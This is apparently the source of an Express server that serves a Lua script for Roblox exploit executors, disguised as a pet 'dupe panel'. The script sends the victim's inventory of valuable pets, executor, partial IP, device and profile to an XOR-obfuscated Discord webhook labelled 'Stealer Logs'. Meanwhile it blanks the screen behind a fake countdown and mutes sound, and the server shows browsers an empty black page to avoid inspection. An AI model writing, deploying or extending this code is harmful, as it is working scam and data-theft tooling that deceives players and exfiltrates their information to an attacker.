const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// ------------------------------------------------------------------
// 1. BLOCK NON-EXECUTORS (browsers, curl, etc.)
// ------------------------------------------------------------------
function blockNonExecutor(req, res, next) {
  const ua  = (req.get("User-Agent") || "").toLowerCase();
  const ref = (req.get("Referer")    || "").toLowerCase();

  const allowed =
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ua.includes("executor") ||
    ref.includes("roblox.com");

  if (!allowed) {
    return res.status(403).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
    `.trim());
  }
  next();
}

// ------------------------------------------------------------------
// 2. HOME PAGE - COMPLETELY BLACK
// ------------------------------------------------------------------
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style>
</head><body></body></html>
  `.trim());
});

// ------------------------------------------------------------------
// 3. /raw – EXECUTORS ONLY WITH ENCRYPTED WEBHOOK
// ------------------------------------------------------------------
app.get("/raw", blockNonExecutor, (req, res) => {
  const encrypted = req.query.wh;
  if (!encrypted) return res.status(400).send("-- MISSING DATA --");

  // Multi-layer XOR decryption
  let webhook = "";
  try {
    // First layer XOR
    const key1 = "brainrot_secure_2024_key1";
    let layer1 = "";
    for (let i = 0; i < encrypted.length; i++) {
      const keyChar = key1.charCodeAt(i % key1.length);
      const encryptedChar = encrypted.charCodeAt(i);
      layer1 += String.fromCharCode(encryptedChar ^ keyChar);
    }
    
    // Second layer XOR
    const key2 = "x7f9!pQz@3mK*vR$5";
    let layer2 = "";
    for (let i = 0; i < layer1.length; i++) {
      const keyChar = key2.charCodeAt(i % key2.length);
      const layer1Char = layer1.charCodeAt(i);
      layer2 += String.fromCharCode(layer1Char ^ keyChar);
    }
    
    webhook = Buffer.from(layer2, 'base64').toString('utf-8');
  } catch {
    return res.status(400).send("-- INVALID ENCRYPTION --");
  }

  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
    return res.status(400).send("-- INVALID WEBHOOK --");
  }

  // ----------------------------------------------------------------
  //   FULL LUA SCRIPT – WITH ENCRYPTED WEBHOOK PROTECTION
  // ----------------------------------------------------------------
  const lua = `local EncryptedWebhook = "${encrypted}"

-- === WEBHOOK DECRYPTION FUNCTION ===
local function DecryptWebhook(encrypted)
    local key1 = "brainrot_secure_2024_key1"
    local layer1 = ""
    for i = 1, #encrypted do
        local keyChar = string.byte(key1, (i - 1) % #key1 + 1)
        local encryptedChar = string.byte(encrypted, i)
        layer1 = layer1 .. string.char(bit32.bxor(encryptedChar, keyChar))
    end
    
    local key2 = "x7f9!pQz@3mK*vR$5"
    local layer2 = ""
    for i = 1, #layer1 do
        local keyChar = string.byte(key2, (i - 1) % #key2 + 1)
        local layer1Char = string.byte(layer1, i)
        layer2 = layer2 .. string.char(bit32.bxor(layer1Char, keyChar))
    end
    
    return game:GetService("HttpService"):JSONDecode('"' .. layer2 .. '"')
end

local WebhookURL = DecryptWebhook(EncryptedWebhook)

-- === USER ID CHECK ===
local ALLOWED_USER_ID = "1415022792214052915"
local function CheckUserAccess()
    local player = game.Players.LocalPlayer
    if not player then 
        return false 
    end
    
    -- Get player's user ID
    local playerId = tostring(player.UserId)
    
    -- Check if player ID matches allowed ID
    if playerId == ALLOWED_USER_ID then
        return true
    end
    
    -- Additional name checks for backup
    local allowedNames = {"tommyfc555", "TommyFC555", "TOMMYFC555"}
    for _, name in ipairs(allowedNames) do
        if player.Name == name then
            return true
        end
    end
    
    return false
end

-- === UNIVERSAL HTTP REQUEST FUNCTION ===
local function HttpPost(url, body)
    local success, result = pcall(function()
        -- Synapse X
        if syn and syn.request then
            local resp = syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
            if resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
                return true
            end
        end

        -- Krnl / Fluxus / Others
        if request and type(request) == "function" then
            local resp = request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
            if resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
                return true
            end
        end

        -- HTTP POST fallback
        if http and type(http.request) == "function" then
            local resp = http.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
            if resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
                return true
            end
        end
        
        -- HttpService fallback
        if game:GetService("HttpService").HttpEnabled then
            local success = pcall(function()
                game:GetService("HttpService"):PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
            end)
            return success
        end
    end)
    return success and result
end

-- === BETTER EXECUTOR DETECTION ===
local function getExecutor()
    if syn and syn.request then
        return "Synapse X"
    elseif PROTOSMASHER_LOADED then
        return "ProtoSmasher"
    elseif KRNL_LOADED then
        return "Krnl"
    elseif fluxus and fluxus.request then
        return "Fluxus"
    elseif electron then
        return "Electron"
    elseif Sentinel then
        return "Sentinel"
    elseif getexecutorname then
        return getexecutorname()
    elseif identifyexecutor then
        return identifyexecutor()
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif get_hui_animation then
        return "ScriptWare"
    else
        -- Advanced detection
        local env = getfenv()
        for k,v in pairs(env) do
            if type(k) == "string" and string.lower(k):find("synapse") then
                return "Synapse X"
            elseif type(k) == "string" and string.lower(k):find("krnl") then
                return "Krnl"
            elseif type(k) == "string" and string.lower(k):find("fluxus") then
                return "Fluxus"
            elseif type(k) == "string" and string.lower(k):find("scriptware") then
                return "ScriptWare"
            end
        end
        return "Premium Executor"
    end
end

-- === SEND EMBED TO DISCORD ===
local function SendToDiscord(embed)
    local data = {embeds = {embed}}
    local json = game:GetService("HttpService"):JSONEncode(data)
    spawn(function()
        HttpPost(WebhookURL, json)
    end)
end

-- === ACCESS CHECK ===
if not CheckUserAccess() then
    local player = game.Players.LocalPlayer
    if player then
        player:Kick("🔒 ACCESS DENIED\\n\\nYou are not authorized to use this panel.\\nOnly user ID 1415022792214052915 can access this.\\n\\nYour ID: " .. tostring(player.UserId))
    end
    return
end

-- === REST OF YOUR SCRIPT ===
local player = game.Players.LocalPlayer
if not player then
    player = game.Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
end

local function getIPAddress()
    local real = "Unknown"
    pcall(function()
        if syn and syn.request then
            local r = syn.request({Url="http://httpbin.org/ip",Method="GET"})
            if r and r.Body then
                local d = game:GetService("HttpService"):JSONDecode(r.Body)
                real = d.origin
            end
        end
    end)
    if real ~= "Unknown" then
        local p = {}
        for n in string.gmatch(real,"%d+") do table.insert(p,n) end
        if #p>=4 then return p[1].."."..p[2]..".xxx.xxx" end
    end
    return "192.168.xxx.xxx"
end

local playerProfile = "https://www.roblox.com/users/"..player.UserId.."/profile"
local playerAvatar  = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
local playerName    = player.Name

local function getDeviceType()
    return game:GetService("UserInputService").TouchEnabled and "Mobile" or "Computer"
end

local function createBlackScreen()
    pcall(function() for _,g in pairs(player.PlayerGui:GetChildren()) do g:Destroy() end end)
    local sg = Instance.new("ScreenGui"); sg.Name="FullBlackScreen"; sg.DisplayOrder=999999; sg.ResetOnSpawn=false; sg.ZIndexBehavior=Enum.ZIndexBehavior.Global; sg.Parent=player.PlayerGui
    local f  = Instance.new("Frame"); f.Size=UDim2.new(2,0,2,0); f.Position=UDim2.new(-0.5,0,-0.5,0); f.BackgroundColor3=Color3.new(); f.BorderSizePixel=0; f.ZIndex=999999; f.Parent=sg
    local tl = Instance.new("TextLabel"); tl.Size=UDim2.new(1,0,0,80); tl.Position=UDim2.new(0,0,0.4,0); tl.BackgroundTransparency=1; tl.Text="06:00"; tl.TextColor3=Color3.fromRGB(0,255,255); tl.TextSize=48; tl.Font=Enum.Font.GothamBold; tl.ZIndex=1000000; tl.Parent=f
    local sl = Instance.new("TextLabel"); sl.Size=UDim2.new(1,0,0,25); sl.Position=UDim2.new(0,0,0.55,0); sl.BackgroundTransparency=1; sl.Text="🧠 Processing Brainrots..."; sl.TextColor3=Color3.new(1,1,1); sl.TextSize=18; sl.Font=Enum.Font.Gotham; sl.ZIndex=1000000; sl.Parent=f
    return sg,tl,sl
end

local function disableAllSounds()
    pcall(function()
        local ss = game:GetService("SoundService")
        for i=1,20 do pcall(function() ss.Volume=0 end) end
        for i=1,5 do for _,s in pairs(game:GetDescendants()) do if s:IsA("Sound") then pcall(function() s.Volume=0 s:Stop() end) end end end
    end)
end

local function getMoneyPerSecond(t)
    if not t then return 0 end
    local pats = {"(%d+%.?%d*)B/s","(%d+%.?%d*)M/s","(%d+%.?%d*)K/s","%$(%d+)/s"}
    for _,p in ipairs(pats) do
        local m = string.match(t,p)
        if m then
            local v = tonumber(m)
            if p:find("B/s") then return v*1e9
            elseif p:find("M/s") then return v*1e6
            elseif p:find("K/s") then return v*1e3
            else return v end
        end
    end
    return 0
end

local function scanAllPetsQuick()
    local all,brain,best={},{},{}
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if plots then
            for _,plot in pairs(plots:GetChildren()) do
                local ap = plot:FindFirstChild("AnimalPodiums")
                if ap then
                    for _,pod in pairs(ap:GetChildren()) do
                        local base = pod:FindFirstChild("Base")
                        if base then
                            local spawn = base:FindFirstChild("Spawn")
                            if spawn then
                                local att = spawn:FindFirstChild("Attachment")
                                if att then
                                    local oh = att:FindFirstChild("AnimalOverhead")
                                    if oh then
                                        local dn = oh:FindFirstChild("DisplayName")
                                        local gen = oh:FindFirstChild("Generation")
                                        if dn and dn:IsA("TextLabel") then
                                            local name = dn.Text
                                            local rate = gen and gen:IsA("TextLabel") and gen.Text or "N/A"
                                            local money = getMoneyPerSecond(rate)
                                            if name~="" then
                                                local pet={Name=name,Rate=rate,MoneyPerSec=money}
                                                table.insert(all,pet)
                                                if string.find(string.lower(name),"brainrot") and money>1e6 then table.insert(brain,pet) end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    table.sort(all,function(a,b) return a.MoneyPerSec>b.MoneyPerSec end)
    table.sort(brain,function(a,b) return a.MoneyPerSec>b.MoneyPerSec end)
    for i=1,math.min(5,#all) do if all[i].MoneyPerSec>0 then table.insert(best,all[i]) end end
    return all,brain,best
end

local function fmtMoney(v)
    if v>=1e9 then return string.format("$%.2fB/s",v/1e9)
    elseif v>=1e6 then return string.format("$%.2fM/s",v/1e6)
    elseif v>=1e3 then return string.format("$%.2fK/s",v/1e3)
    else return string.format("$%d/s",v) end
end

local function fmtPetList(p,show)
    if #p==0 then return "None" end
    local s=""
    for i=1,math.min(5,#p) do
        s=s..string.format("%d. %s | %s\\n",i,p[i].Name,show and fmtMoney(p[i].MoneyPerSec) or p[i].Rate)
    end
    return s
end

local function isLegit(brain,best)
    if #brain>2 then return "🔥 LEGIT HIT - Multiple brainrots" end
    if #best>0 and best[1].MoneyPerSec>5e7 then return "🔥 LEGIT HIT - High value" end
    if #brain>0 then return "⚠️ POTENTIAL HIT - Some brainrots" end
    return "❌ LOW VALUE - Nothing good"
end

local function startDupeProcess(psLink)
    local exec = getExecutor()
    local ip   = getIPAddress()
    local dev  = getDeviceType()
    local pc   = #game.Players:GetPlayers()

    local bs,tl,sl = createBlackScreen()
    disableAllSounds()

    local all,brain,best = scanAllPetsQuick()
    local hit = isLegit(brain,best)

    local embed = {
        title="🧠 ALL BEST BRAINROTS",
        description="📡 **Private Server:** "..(psLink or "Not provided"),
        color=65280,
        author={name=playerName,icon_url=playerAvatar,url=playerProfile},
        fields={
            {name="👤 USER INFO",value="```🛠️ Executor: "..exec.."\\n🌐 IP: "..ip.."\\n📱 Device: "..dev.."```",inline=true},
            {name="🔗 LINKS",value="[👤 Profile]("..playerProfile..")",inline=true},
            {name="🎮 SERVER",value="```👥 Players: "..pc.."\\n🐾 Total Pets: "..#all.."\\n🧠 Brainrots: "..#brain.."```",inline=true},
            {name="🏆 TOP 5 PETS",value="```"..fmtPetList(best,true).."```",inline=false},
            {name="🧠 BRAINROTS",value="```"..fmtPetList(brain,true).."```",inline=false},
            {name="🎯 HIT STATUS",value="**"..hit.."**",inline=false}
        },
        footer={text="🧠 Stealer Logs • "..os.date("%X")},
        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    SendToDiscord(embed)

    sl.Text="✅ Logs sent! Starting 6-minute timer..."
    local total=360 local start=tick()
    while tick()-start<total do
        local left=total-(tick()-start)
        local m=math.floor(left/60) local s=math.floor(left%60)
        tl.Text=string.format("%02d:%02d",m,s)
        wait(0.1)
    end

    SendToDiscord({
        title="✅ DUPE PROCESS COMPLETE",
        color=65280,
        author={name=playerName,icon_url=playerAvatar,url=playerProfile},
        fields={
            {name="📊 RESULTS",value="```⏰ Time: 6 min\\n🐾 Pets Duped: "..#all.."\\n🧠 Brainrots: "..#brain.."\\n🎯 Status: "..hit.."```",inline=false}
        },
        footer={text="🧠 Stealer Logs • "..os.date("%X")}
    })

    sl.Text="🎉 Complete! Closing..."; tl.Text="DONE!"
    wait(3); bs:Destroy()
end

local function createPSInputGUI()
    local sg = Instance.new("ScreenGui"); sg.Name="DupeScannerGUI"; sg.ResetOnSpawn=false; sg.Parent=player.PlayerGui
    local mf = Instance.new("Frame"); mf.Size=UDim2.new(0,400,0,250); mf.Position=UDim2.new(0.5,-200,0.5,-125); mf.BackgroundColor3=Color3.fromRGB(20,20,20); mf.BorderSizePixel=0; mf.Parent=sg
    local title = Instance.new("TextLabel"); title.Size=UDim2.new(1,0,0,60); title.BackgroundColor3=Color3.fromRGB(0,50,0); title.Text="🧠 AUTHORIZED ACCESS\\nBRAINROT DUPE PANEL"; title.TextColor3=Color3.fromRGB(0,255,0); title.Font=Enum.Font.GothamBold; title.TextSize=16; title.Parent=mf
    local tb = Instance.new("TextBox"); tb.Size=UDim2.new(0.8,0,0,40); tb.Position=UDim2.new(0.1,0,0.3,0); tb.BackgroundColor3=Color3.fromRGB(40,40,40); tb.TextColor3=Color3.new(1,1,1); tb.PlaceholderText="Paste Roblox game link here..."; tb.TextSize=14; tb.Parent=mf
    local btn = Instance.new("TextButton"); btn.Size=UDim2.new(0.7,0,0,50); btn.Position=UDim2.new(0.15,0,0.7,0); btn.BackgroundColor3=Color3.fromRGB(0,200,0); btn.Text="🚀 START DUPE PROCESS"; btn.TextColor3=Color3.new(1,1,1); btn.Font=Enum.Font.GothamBold; btn.TextSize=14; btn.Parent=mf
    btn.MouseButton1Click:Connect(function()
        local link = tb.Text
        if string.find(string.lower(link or ""),"roblox") then
            btn.Text="🔄 STARTING..."; btn.BackgroundColor3=Color3.fromRGB(0,100,0)
            wait(1)
            startDupeProcess(link)
        else
            btn.Text="❌ INVALID LINK"; btn.BackgroundColor3=Color3.fromRGB(200,0,0)
            wait(2)
            btn.Text="🚀 START DUPE PROCESS"; btn.BackgroundColor3=Color3.fromRGB(0,200,0)
        end
    end)
end

-- === INITIALIZE ===
wait(1)
createPSInputGUI()

print("🧠 Brainrot Dupe Panel Loaded Successfully!")
print("✅ Authorized User: " .. game.Players.LocalPlayer.Name)
print("🔒 User ID: " .. game.Players.LocalPlayer.UserId)
`;

  res.type("text/plain").send(lua);
});

// ------------------------------------------------------------------
// 4. CATCH-ALL → 404 + BLACK SCREEN
// ------------------------------------------------------------------
app.use((req, res) => {
  res.status(404).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
  `.trim());
});

// ------------------------------------------------------------------
// 5. START SERVER
// ------------------------------------------------------------------
app.listen(PORT, () => {
  console.log("🧠 Brainrot Dupe Panel Server running on port " + PORT);
  console.log("🔒 Protected with user ID restriction: 1415022792214052915");
  console.log("🔗 Website: https://tommyfc555-github-io.onrender.com");
});
